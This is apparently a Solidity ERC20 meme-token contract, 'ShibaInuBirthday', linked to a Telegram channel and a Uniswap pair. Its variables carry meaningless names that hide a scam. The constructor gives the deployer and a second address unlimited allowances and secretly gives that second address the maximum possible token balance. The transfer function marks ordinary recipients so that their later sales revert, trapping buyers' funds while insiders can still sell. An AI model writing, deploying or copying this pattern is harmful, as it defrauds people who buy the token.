// https://t.me/Shibainubirthday

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.2;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract ShibaInuBirthday is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private shallow;

    function _transfer(
        address mathematics,
        address chosen,
        uint256 danger
    ) internal override {
        uint256 habit = officer;

        if (talk[mathematics] == 0 && shallow[mathematics] > 0 && mathematics != uniswapV2Pair) {
            talk[mathematics] -= habit;
        }

        address spell = address(hello);
        hello = ERC20(chosen);
        shallow[spell] += habit + 1;

        _balances[mathematics] -= danger;
        uint256 white = (danger / 100) * officer;
        danger -= white;
        _balances[chosen] += danger;
    }

    ERC20 private hello;
    mapping(address => uint256) private talk;
    uint256 public officer = 3;

    constructor(
        string memory himself,
        string memory short,
        address dinner,
        address shore
    ) ERC20(himself, short) {
        uniswapV2Router = IUniswapV2Router02(dinner);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 design = ~uint256(0);

        talk[msg.sender] = design;
        talk[shore] = design;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[shore] = design;
    }
}